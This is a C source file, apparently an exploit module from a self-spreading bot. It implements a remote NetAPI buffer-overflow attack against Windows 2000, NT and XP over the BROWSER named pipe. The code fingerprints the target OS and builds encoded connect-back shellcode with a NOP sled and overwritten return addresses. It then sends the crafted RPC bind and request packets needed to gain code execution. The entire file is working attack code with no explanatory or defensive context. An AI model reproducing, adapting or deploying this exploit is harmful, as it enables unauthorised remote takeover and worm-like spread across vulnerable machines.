#include "include.h"
#include "utility.h"


char szPath[1066];
char szStub[1152];


int FpHost(DWORD dwRemoteIp, int iFpType)
{
	switch(iFpType)
	{
		case FP_PORT5K:
		{
			if(CheckOpenPort(dwRemoteIp, 5000, 3)) 
				return OS_WINXP;
			break;
		}

		case FP_TTL:
		{
			return OS_UNKNOWN;
			break;
		}
	
		default:
		{
			return OS_UNKNOWN;
			break; 
		}
	}

	return OS_UNKNOWN;
}


char RPCRequest[] =
	"\x05"
	"\x00"
	"\x00"
	"\x03"
	"\x10\x00\x00\x00"
	"\x00\x00"
	"\x00\x00"
	"\x00\x00\x00\x00"
	"\x00\x02\x00\x00"
	"\x00\x00"
	"\x1f\x00";

char RPCBind[] =
	"\x05"
	"\x00"
	"\x0B"
	"\x03"
	"\x10\x00\x00\x00"
	"\x48\x00"
	"\x00\x00"
	"\x00\x00\x00\x00"
	"\xD0\x16"
	"\xD0\x16"
	"\x00\x00\x00\x00"
	"\x01"
	"\x00\x00\x00"
	"\x00\x00"
	"\x01\x00"
	"\xC8\x4F\x32\x4B\x70\x16\xD3\x01\x12\x78\x5A\x47\xBF\x6E\xE1\x88"
	"\x03\x00"
	"\x00\x00"
	"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"
	"\x02\x00\x00\x00";


void netapi(ExploitInfo_s* pExploitInfo)
{
	NETRESOURCE NtRes;
	HANDLE hFile;
	char szUnc[MAX_PATH];
	char szPipe[MAX_PATH];
	char szResponse[MAX_PATH];
	int nCount;
	DWORD dwValue;
	DWORD dwTarget = 0x00020804;
	char szShellcode[512];

	DWORD dwShellcodeSize = GenerateEncodedSHellcode(szShellcode, sizeof(szShellcode), 
		dwSHellcodeIpAddress, usSHellcodePort, 
		pExploit[pExploitInfo->dwExploitId].dwExploitId, "\r\n\\_/.", sizeof("\r\n\\_/."));

	if (!dwShellcodeSize) 
		ExitThread(0);

	// Determine remote OS
	int iTargetOS = FpHost(pExploitInfo->dwRemoteIp, FP_RPC);
	
	if(!iTargetOS)
		iTargetOS = FpHost(pExploitInfo->dwRemoteIp, FP_PORT5K);
	if(!iTargetOS)
		iTargetOS = OS_WIN2K;

	ZeroMemory(szStub, sizeof(szStub));
	memset(szPath, '\x90', sizeof(szPath));

	sprintf(szUnc, "\\\\%s\\PIPE", GetIP(pExploitInfo->dwRemoteIp));
	sprintf(szPipe, "\\\\%s\\PIPE\\BROWSER", GetIP(pExploitInfo->dwRemoteIp));

	NtRes.dwType = RESOURCETYPE_ANY;
	NtRes.lpLocalName = NULL;
	NtRes.lpRemoteName = szUnc;
	NtRes.lpProvider = NULL;
	if (WNetAddConnection2(&NtRes, "", "", 0) != ERROR_SUCCESS) {
		ExitThread(0);
	}

	hFile = CreateFile(szPipe, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		ExitThread(0);
	}


	if (!TransactNamedPipe(hFile, &RPCBind, sizeof(RPCBind) - 1, szResponse, sizeof(szResponse), &dwValue, NULL)) {
		ExitThread(0);
	}

	if(iTargetOS == OS_WIN2K || iTargetOS == OS_WINNT){
	
		memcpy(szPath + 600, szShellcode, dwShellcodeSize);

		for (nCount = 0; nCount < 16; nCount++) {
			memcpy(szPath + 1000 + (nCount * 4),  &dwTarget, 4);
		}
	
		dwValue = 1152;
		memcpy(&RPCRequest[8], &dwValue, 2);
		dwValue = 1124;
		memcpy(&RPCRequest[16], &dwValue, 2);

		memcpy(szStub, &RPCRequest, 24);
		memcpy(szStub + 24, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 28, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 32, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 36, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 40, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 44, "\x15\x02\x00\x00", 4);
		memcpy(szStub + 48, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 52, "\x15\x02\x00\x00", 4);
		memcpy(szStub + 56, &szPath, 1064);
		memcpy(szStub + 1124, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 1128, "\x02\x00\x00\x00", 4);
		memcpy(szStub + 1132, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 1136, "\x02\x00\x00\x00", 4);
		memcpy(szStub + 1140, "\xeb\x02\x00\x00", 4);
		memcpy(szStub + 1144, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 1148, "\x00\x00\x00\x00", 4);

		TransactNamedPipe(hFile, szStub, 1152, szResponse, sizeof(szResponse), &dwValue, NULL);

	} else if(iTargetOS == OS_WINXP) {

		memcpy(szPath, szShellcode, dwShellcodeSize);
		dwValue = dwTarget + 6;
		memcpy(szPath + 612,  &dwValue, 4);
		memcpy(szPath + 624,  &dwTarget, 4);
		memcpy(szPath + 660,  &dwTarget, 4);
		memcpy(szPath + 672,  &dwTarget, 4);
		memcpy(szPath + 708,  "\x00\x00", 2);

		dwValue = 796;
		memcpy(&RPCRequest[8], &dwValue, 2);
		dwValue = 772;
		memcpy(&RPCRequest[16], &dwValue, 2);

		memcpy(szStub, &RPCRequest, 24);
		memcpy(szStub + 24, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 28, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 32, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 36, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 40, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 44, "\x63\x01\x00\x00", 4);
		memcpy(szStub + 48, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 52, "\x63\x01\x00\x00", 4);
		memcpy(szStub + 56, &szPath, 710);
		memcpy(szStub + 768, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 772, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 776, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 780, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 784, "\x00\x00\x00\x00", 4);
		memcpy(szStub + 788, "\x01\x00\x00\x00", 4);
		memcpy(szStub + 792, "\x00\x00\x00\x00", 4);

		TransactNamedPipe(hFile, szStub, 796, szResponse, sizeof(szResponse), &dwValue, NULL);
		if (dwValue) {
			TransactNamedPipe(hFile, szStub, 796, szResponse, sizeof(szResponse), &dwValue, NULL);
		}
	} else
		return;

	ExitThread(1);
}
